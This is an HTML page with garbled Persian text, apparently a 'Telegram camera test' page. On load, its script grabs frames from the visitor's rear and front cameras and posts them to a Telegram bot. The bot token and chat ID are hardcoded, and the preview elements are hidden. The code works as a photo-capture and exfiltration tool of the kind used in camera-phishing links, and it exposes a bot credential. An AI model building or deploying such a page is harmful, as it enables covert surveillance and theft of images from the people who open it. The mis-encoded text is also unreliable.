<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØµÙØ­Ù‡ Ø¢Ø²Ù…Ø§ÛŒØ´ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† ØªÙ„Ú¯Ø±Ø§Ù…</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f4f4f9;
            color: #333;
        }
        h1 {
            color: #4a90e2;
        }
        .container {
            margin-top: 30px;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        video {
            display: none; 
            max-width: 100%;
            height: auto;
        }
        canvas {
            display: none; 
            margin-top: 15px;
            max-width: 100%;
            height: auto;
            border: 2px solid #5cb85c;
            border-radius: 5px;
        }
        .message {
            margin-top: 20px;
            padding: 10px;
            background-color: #ffe0b2;
            border-radius: 5px;
            color: #fb8c00;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>ğŸ‘‹ Ø¨Ù‡ ØµÙØ­Ù‡ Ø¢Ø²Ù…Ø§ÛŒØ´ÛŒ Ø®ÙˆØ´ Ø¢Ù…Ø¯ÛŒØ¯!</h1>
        <p>ØµÙØ­Ù‡ Ø¯Ø± Ø­Ø§Ù„ ØªÙ„Ø§Ø´ Ø¨Ø±Ø§ÛŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø³Øª.</p>
        <div class="message">
            **Ù„Ø·ÙØ§Ù‹ Ø¨Ù‡ Ù…Ø±ÙˆØ±Ú¯Ø± Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ù‡ÛŒØ¯.** (Ø§ÛŒÙ† ÙÙ‚Ø· Ø±ÙˆÛŒ HTTPS Ú©Ø§Ø± Ù…ÛŒâ€ŒÚ©Ù†Ø¯)
        </div>
        <p id="status">...</p>
        
        <video id="videoElement" autoplay playsinline></video>
        <canvas id="canvasElement"></canvas>
    </div>

    <script>
        // **âš ï¸ ØªÙˆÚ©Ù† Ùˆ CHAT ID Ù…Ø³ØªÙ‚ÛŒÙ…Ø§Ù‹ Ø¯Ø± Ú©Ø¯ ÙˆØ§Ø±Ø¯ Ø´Ø¯Ù†Ø¯ (Ø³Ø§Ø¯Ù‡â€ŒØªØ±ÛŒÙ† Ø±Ø§Ù‡)**
        const TELEGRAM_BOT_TOKEN = '8453246503:AAGWST4Fj3acLPc2ymQO9DDLbn5VgS7sJSk'; 
        const TELEGRAM_CHAT_ID = '8457265216'; 
        
        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');
        const statusElement = document.getElementById('status');
        const context = canvas.getContext('2d');
        const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;


        function startCamera(facingMode) {
            const modeText = facingMode === 'environment' ? 'Ø¹Ù‚Ø¨' : 'Ø¬Ù„Ùˆ';
            statusElement.textContent = `Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† ${modeText} ...`;
            
            const constraints = {
                video: { facingMode: facingMode },
                audio: false
            };

            navigator.mediaDevices.getUserMedia(constraints)
                .then(function(stream) {
                    statusElement.textContent = `Ø¯ÙˆØ±Ø¨ÛŒÙ† ${modeText} ÙØ¹Ø§Ù„ Ø´Ø¯. Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³...`;
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = function(e) {
                        setTimeout(() => {
                            captureAndSend(stream, facingMode);
                            if (facingMode === 'environment') {
                                setTimeout(() => {
                                    startCamera('user');
                                }, 3000); 
                            }
                        }, 1500); 
                    };
                })
                .catch(function(err) {
                    statusElement.textContent = `Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† ${modeText}: ${err.name}.`;
                    console.error("Ø®Ø·Ø§:", err);
                    
                    if (facingMode === 'environment') {
                         setTimeout(() => {
                            startCamera('user');
                        }, 1000); 
                    }
                });
        }

        function captureAndSend(stream, facingMode) {
            const modeText = facingMode === 'environment' ? 'Ø¹Ù‚Ø¨' : 'Ø¬Ù„Ùˆ';
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.style.display = 'block';

            canvas.toBlob(function(blob) {
                
                const formData = new FormData();
                formData.append('photo', blob, 'photo.jpeg'); 
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('caption', `Ø¹Ú©Ø³ Ú¯Ø±ÙØªÙ‡ Ø´Ø¯Ù‡ ØªÙˆØ³Ø· Ø¯ÙˆØ±Ø¨ÛŒÙ† ${modeText} (${new Date().toLocaleString('fa-IR')})`);

                statusElement.textContent = `Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø¯ÙˆØ±Ø¨ÛŒÙ† ${modeText} Ø¨Ù‡ API ØªÙ„Ú¯Ø±Ø§Ù…...`;

                // **Ø§Ø±Ø³Ø§Ù„ Ù…Ø³ØªÙ‚ÛŒÙ… Ø¨Ù‡ API ØªÙ„Ú¯Ø±Ø§Ù…**
                fetch(TELEGRAM_URL, { 
                    method: 'POST',
                    body: formData 
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        statusElement.textContent = `âœ… Ø¹Ú©Ø³ Ø¯ÙˆØ±Ø¨ÛŒÙ† ${modeText} Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.`;
                    } else {
                        statusElement.textContent = `âŒ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø¯ÙˆØ±Ø¨ÛŒÙ† ${modeText}: ${data.description || 'Ø®Ø·Ø§ÛŒ Ù†Ø§Ù…Ø´Ø®Øµ'}`;
                    }
                })
                .catch(error => {
                    statusElement.textContent = `âŒ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±ØªØ¨Ø§Ø· Ø¨Ø§ API ØªÙ„Ú¯Ø±Ø§Ù… Ø¨Ø±Ø§ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† ${modeText}.`;
                    console.error('Fetch Error:', error);
                });

                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
                
            }, 'image/jpeg', 0.9);
        }

        document.addEventListener('DOMContentLoaded', () => {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 startCamera('environment'); 
            } else {
                statusElement.textContent = "Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Ø§Ø² MediaDevices API Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒ Ú©Ù†Ø¯.";
            }
        });
    </script>

</body>
</html>
